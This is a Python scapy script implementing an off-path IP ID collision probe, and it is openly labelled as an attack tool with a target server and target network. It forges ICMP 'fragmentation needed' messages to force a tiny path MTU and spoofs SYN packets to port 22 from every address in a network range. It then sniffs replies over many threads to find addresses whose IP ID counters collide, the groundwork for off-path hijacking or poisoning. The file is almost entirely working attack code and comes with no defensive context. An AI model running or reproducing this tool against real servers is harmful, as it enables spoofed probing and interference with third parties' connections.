# coding=utf-8

import struct
import threading
import time
import socket
from scapy.all import *
from scapy.layers.inet import *
from scapy.layers.l2 import *

TCP_INVALID_RATELIMIT = 0.5


class Task:

    def __init__(self, addr, count=0, l_time=0.0):
        self.addr = addr
        self.count = count
        self.l_time = l_time

    def __cmp__(self, other):
        return self.count > other.count

    def __eq__(self, other):
        return self.addr == other.addr

    def __hash__(self):
        return hash(self.addr)


class Collision_Prob:

    def __init__(self, attack_target_server='10.10.100.2', bind_iface_name='ens33',
                 attack_target_network='20.0.0.0', net_type='B', num_thread=5, block_size=100,
                 threshold_hit=2, verbose=False):
        self.server_ip = attack_target_server
        self.my_if_name = bind_iface_name
        self.attacker_ip = get_if_addr(self.my_if_name)

        self.net_work_num = attack_target_network

        self.verbose = verbose
        self.N_THREAD = num_thread
        self.BLOCK = block_size
        self.MX = threshold_hit

        self.__z_payload = b''
        self.__sleep_time = TCP_INVALID_RATELIMIT

        self.__semaphore_ipid = threading.Semaphore(1)
        self.__semaphore = threading.Semaphore(1)

        self.__task_list = []

        d_net_type = {'A': 24, 'a': 24, 'B': 16, 'b': 16, 'C': 8, 'c': 8}
        self.__start_point = socket.ntohl(struct.unpack("I",socket.inet_aton(str(self.net_work_num)))[0])
        self.__current_point = self.__start_point
        self.__end_point = self.__start_point + (1 << d_net_type[net_type]) - 1
        self.__stop = False
        self.result = []

        self.send_n = 0
        self.send_byte = 0
        self.cost_time = -1

        for i in range(0, 520):
            self.__z_payload += struct.pack('B', 0)

    def check_new_list(self, list_d):
        C = len(list_d)
        L = 0

        icmp_seq = random.randint(0, (1 << 16) - 1)

        send_list = []
        for d in list_d:
            send_list.append(IP(src=self.attacker_ip, dst=self.server_ip) /
                             ICMP(type=3, code=4, nexthopmtu=68) /
                             IP(flags=2, src=self.server_ip, dst=inet_ntoa(struct.pack('I', socket.htonl(d)))) /
                             ICMP(type=0, code=0) /
                             self.__z_payload)

        send_list.append(IP(src=self.attacker_ip, dst=self.server_ip) / ICMP(id=icmp_seq))
        for d in list_d:
            send_list.append(IP(src=inet_ntoa(struct.pack('I', socket.htonl(d))), dst=self.server_ip) /
                             TCP(sport=RandShort(), dport=22, flags='S'))
            send_list.append(IP(src=self.attacker_ip, dst=self.server_ip) / ICMP(id=icmp_seq))

        for pkg in send_list:
            L += len(pkg)

        while True:
            self.__semaphore_ipid.acquire()
            self.send_byte += L
            self.send_n += len(send_list)
            pkts = sniff(filter="icmp and icmp[4:2]=" + str(icmp_seq) + " and dst " + self.attacker_ip,
                         iface=self.my_if_name, count=1 + C, timeout=2, started_callback=
                         lambda: send(send_list, iface=self.my_if_name, verbose=False))
            self.__semaphore_ipid.release()
            if len(pkts) != 1 + C:
                time.sleep(self.__sleep_time)
            else:
                break

        ipids = []
        for pk in pkts:
            ipids.append(pk[1].fields['id'])

        next = []
        for i in range(1, C + 1):
            if ipids[i] - ipids[i - 1] >= 2:
                next.append(list_d[i - 1])

        return next

    def check_task_new_block(self):
        d_set = set()
        d_list = []
        self.__semaphore.acquire()
        task_set = set(self.__task_list)
        ls = list(task_set)

        for di in ls:
            task_set.remove(di)
            d_list.append(di.addr)
            d_set.add(di)
            if len(d_list) == self.BLOCK:
                break

        self.__task_list = list(task_set)

        if len(d_list) == self.BLOCK:
            list_d = d_list
            self.__semaphore.release()
        else:
            s_p = self.__current_point
            self.__current_point += self.BLOCK - len(d_list)
            current_point = min(self.__end_point, self.__current_point)
            e_p = current_point
            if current_point == self.__end_point:
                self.__stop = True
            self.__semaphore.release()

            list_d = list(range(s_p, e_p))
            list_d.extend(d_list)
            if self.verbose:
               print('checking: ' + inet_ntoa(struct.pack('I', socket.htonl(s_p))) + ' - ' +
                      inet_ntoa(struct.pack('I', socket.htonl(e_p))))

        ipid_next = self.check_new_list(list_d)

        if len(ipid_next) != 0:
            add_task_new = []
            add_task = set()
            add_set = []

            for d in ipid_next:
                if Task(d) in d_set:
                    add_task.add(d)
                else:
                    add_task_new.append(d)

            for d in add_task_new:
                add_set.append(Task(d, 1))

            for dt in d_set:
                if dt.addr in add_task:
                    if dt.count == self.MX - 1:
                        found_str = inet_ntoa(struct.pack('I', socket.htonl(dt.addr)))
                        self.__semaphore.acquire()
                        self.result.append(found_str)
                        self.__semaphore.release()
                        print('--Found Collisison ' + str(len(self.result)) + ': ' + str(found_str))

                    add_set.append(Task(dt.addr, dt.count + 1))

            self.__semaphore.acquire()
            self.__task_list.extend(add_set)
            self.__semaphore.release()

    def check_template(self,):
        if self.__stop:
            return
        else:
            self.check_task_new_block()

        t = threading.Thread(target=self.check_template)
        t.start()

    def run(self):
        for i in range(0, self.N_THREAD):
            t = threading.Thread(target=self.check_template)
            t.start()
            time.sleep(0.1)
            if self.verbose:
                print('Num_' + str(i) + ' thread started.')

    def wait_for_res(self):
        ts = time.time()
        while not self.__stop:
            time.sleep(1)
        te = time.time()
        print('------ Collision Find ------')
        print('Target Server: ' + self.server_ip)
        print('Target Network: ' + self.net_work_num)
        for i in range(len(self.result)):
            print('Collision IP ' + str(i) + ' : ' + self.result[i])
        print('Send Packets: ' + str(self.send_n))
        print('Send Bytes: ' + str(self.send_byte) + ' (Bytes)')
        print('Cost Time: ' + str(te - ts) + ' (s)')
        self.cost_time = te - ts

